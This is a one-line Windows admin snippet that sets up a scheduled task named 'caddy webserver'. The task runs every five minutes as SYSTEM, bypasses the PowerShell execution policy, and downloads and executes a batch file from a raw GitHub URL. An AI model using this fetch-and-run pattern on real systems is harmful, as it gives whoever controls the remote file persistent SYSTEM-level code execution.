create task
```
schtasks /create /tn "caddy webserver" /sc minute /mo 5 /ru SYSTEM /rl HIGHEST /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command $s=(Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/florianthepro/caddy/main/caddy.bat').Content; cmd.exe /c $s" /f
```
